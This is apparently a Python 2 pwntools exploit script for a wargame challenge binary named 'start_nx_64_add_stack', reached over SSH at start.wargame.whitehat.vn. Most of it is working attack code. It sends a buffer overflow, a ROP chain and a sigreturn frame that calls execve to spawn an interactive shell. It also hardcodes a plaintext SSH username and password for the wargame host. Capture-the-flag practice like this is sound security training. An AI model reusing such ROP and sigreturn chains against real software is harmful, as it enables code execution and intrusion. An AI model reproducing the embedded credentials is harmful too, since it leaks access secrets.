#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'debug'
context.arch = 'amd64'

###

if DEBUG:
    r = process('./start_nx_64_add_stack')
else:
    # tmp directory needs to have a file 'upon: ' with code to execute: eg, flag reader program
    s = ssh(host = 'start.wargame.whitehat.vn', user = 'pwnstart1', password = '9283rowjfow32ordosw023')
    # tmp folder needs to have the executable script/binary
    s.set_working_directory('/tmp/totolaxa')
    r = s.process('/home/pwnstart/problem521a60a832b5891ec4ee98b386b2952e/start_nx_64_add_stack', env = {'PATH':'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmp/totolaxa'})

GDB = False
if GDB:
    gdb.attach(r, 'b *0x0000000000400152')
r.recvuntil('weapon: ')
f = SigreturnFrame()
f.rax = constants.SYS_execve
f.rdi = 0x4000fa # string in binary
f.rsi = 0x0
f.rdx = 0x0
f.rsp = 0x00000000004000F4
f.rip = 0x00000000004000f4 # syscall
ROP  = 'A' * 40
ROP += p64(0x00400151) # pop rdx ; ret
ROP += p64(0x300)
ROP += p64(0x400149)

log.info('len(ROP): %#x' % len(ROP))
r.sendline(ROP)

time.sleep(2)

ROP  = p64(0x300) * 13
ROP += p64(0x0000000000400132)
ROP += p64(0x300) * 5
ROP += p64(0x00000000004000f4) # syscall
ROP += str(f)
r.sendline(ROP)

time.sleep(2)

r.send('A' * 15) # set sigret rax

r.interactive()
if not DEBUG:
    s.close()
r.close()
